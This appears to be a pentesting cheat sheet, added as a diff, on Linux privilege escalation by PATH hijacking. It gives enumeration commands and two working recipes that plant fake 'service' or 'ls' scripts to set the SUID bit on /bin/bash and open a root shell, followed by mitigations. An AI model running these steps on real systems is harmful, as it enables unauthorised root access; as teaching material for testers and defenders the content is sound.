@@ -1,0 +1,60 @@
+# Privilege Escalation: PATH
+
+## Concept
+`$PATH` is the ordered list of directories the shell searches when a command is called without a full path. If a root-run script/binary calls another command by name (not full path), and a writable/attacker-controlled directory appears earlier in `$PATH`, you can hijack that call.
+
+## Enumeration
+```bash
+echo $PATH
+# check for writable dirs in PATH
+find / -writable -type d 2>/dev/null
+
+# inspect SUID binaries/scripts for relative calls
+strings /path/to/suid_binary | grep -v "^/"
+```
+
+Look at scripts (especially SUID scripts or cron scripts) for command calls without full paths, e.g.:
+```bash
+cat suspicious_script.sh
+# BAD (hijackable):  service apache2 restart
+# GOOD (safe):        /usr/sbin/service apache2 restart
+```
+
+## Exploitation
+
+### 1. Hijack via writable PATH directory
+```bash
+# find a writable dir early in PATH, or create one and prepend
+mkdir -p /tmp/hijack
+echo -e '#!/bin/bash\nchmod +s /bin/bash' > /tmp/hijack/service
+chmod +x /tmp/hijack/service
+export PATH=/tmp/hijack:$PATH
+
+# trigger the vulnerable SUID binary/script that calls "service" without full path
+./vulnerable_suid_binary
+/bin/bash -p
+```
+
+### 2. Relative path SUID binary
+If a SUID binary itself is called with a relative path and internally calls another program by name:
+```bash
+cd /tmp/hijack
+cat > ls << 'EOF'
+#!/bin/bash
+chmod +s /bin/bash
+EOF
+chmod +x ls
+export PATH=.:$PATH
+/path/to/suid_binary   # if it internally calls "ls"
+```
+
+## Checklist
+- [ ] Check `echo $PATH` ordering
+- [ ] Find writable directories on PATH
+- [ ] Inspect SUID binaries/cron scripts for relative (unqualified) command calls
+- [ ] Craft malicious binary with the hijacked name in a writable/prepended dir
+
+## Mitigation
+- Always use full paths in scripts run as root/SUID binaries
+- Set a fixed, safe `PATH` at the start of scripts (`PATH=/usr/bin:/bin`)
+- Avoid writable directories early in system-wide `PATH`
